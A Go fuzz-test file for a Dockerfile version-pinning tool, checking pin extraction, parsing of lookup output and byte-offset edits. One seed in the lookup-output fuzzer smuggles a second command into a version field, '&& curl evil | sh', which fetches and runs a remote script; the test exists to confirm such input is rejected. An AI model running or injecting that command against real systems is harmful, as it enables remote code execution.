package pins

import (
	"bytes"
	"testing"

	"github.com/Arham1716/imgowner/internal/dockerfile"
)

// FuzzExtract runs pin extraction over arbitrary Dockerfiles (FR-46). Beyond
// not panicking, every pin's ByteOffset must either be -1 or point at exactly
// its version text, because ApplyEdits later rewrites the file at that offset.
func FuzzExtract(f *testing.F) {
	seeds := []string{
		"FROM debian:12\nRUN apt-get install -y curl=7.88.1-10 openssl=3.0.11-1\n",
		"FROM alpine:3.20\nRUN apk add --no-cache curl=8.9.1-r0\n",
		"FROM rockylinux:9\nRUN dnf install -y curl-7.76.1-29.el9\n",
		"ARG V=1.0\nFROM debian\nRUN apt-get install -y pkg=${V}\n",
		"FROM debian\nRUN apt-get install -y \\\n  curl=7.88.1-10 && \\\n  apt-get install -y curl=7.88.1-10\n",
		"FROM debian\nRUN apt-get install -y a==1 =2 b=\n",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}

	f.Fuzz(func(t *testing.T, content []byte) {
		df, err := dockerfile.ParseBytes(content)
		if err != nil {
			return
		}
		pins, err := Extract(content, df)
		if err != nil {
			return
		}
		for _, p := range pins {
			if p.ByteOffset == -1 {
				continue
			}
			end := p.ByteOffset + len(p.Version)
			if p.ByteOffset < 0 || end > len(content) {
				t.Fatalf("pin %+v: offset out of bounds for %d-byte file", p, len(content))
			}
			if !bytes.Equal(content[p.ByteOffset:end], []byte(p.Version)) {
				t.Fatalf("pin %+v: offset points at %q, not the version", p, content[p.ByteOffset:end])
			}
		}
	})
}

// FuzzParseLookupOutput treats the lookup container's stdout as hostile, which
// it is: the container runs the user's base image. Whatever it prints, a
// version that reaches a pin must be a plain version string.
func FuzzParseLookupOutput(f *testing.F) {
	f.Add([]byte("UPDATE|curl|7.88.1-10|7.88.1-12\nCURRENT|openssl|3.0.11-1|3.0.11-1\nUNAVAILABLE|gone\n"))
	f.Add([]byte("UPDATE|curl|7.88.1-10|1.0 && curl evil | sh\n"))
	f.Add([]byte("UPDATE|tzdata|1:2024a-0|1:2024b-0\n"))
	f.Add([]byte("||||\n|\n"))

	f.Fuzz(func(t *testing.T, out []byte) {
		pins := []Pin{
			{Package: "curl", Version: "7.88.1-10", Status: StatusUnknown},
			{Package: "openssl", Version: "3.0.11-1", Status: StatusUnknown},
			{Package: "tzdata", Version: "1:2024a-0", Status: StatusUnknown},
		}
		for _, p := range parseLookupOutput(out, pins) {
			if p.Available != "" && !isPlainVersion(p.Available) {
				t.Fatalf("pin %s accepted non-plain version %q", p.Package, p.Available)
			}
		}
	})
}

// FuzzApplyEdits checks the byte editor's contract on arbitrary input: it
// either refuses the edit or returns content whose length changed by exactly
// the replacement delta, with the new version at the edited offset.
func FuzzApplyEdits(f *testing.F) {
	f.Add([]byte("RUN apt-get install -y curl=7.88.1-10\n"), 28, "7.88.1-10", "7.88.1-12")
	f.Add([]byte("x"), -1, "", "y")
	f.Add([]byte(""), 0, "a", "b")

	f.Fuzz(func(t *testing.T, content []byte, offset int, oldV, newV string) {
		got, err := ApplyEdits(content, []Edit{{ByteOffset: offset, OldVersion: oldV, NewVersion: newV}})
		if err != nil {
			return
		}
		if want := len(content) - len(oldV) + len(newV); len(got) != want {
			t.Fatalf("result length %d, want %d", len(got), want)
		}
		if !bytes.Equal(got[offset:offset+len(newV)], []byte(newV)) {
			t.Fatalf("new version not at offset %d", offset)
		}
	})
}
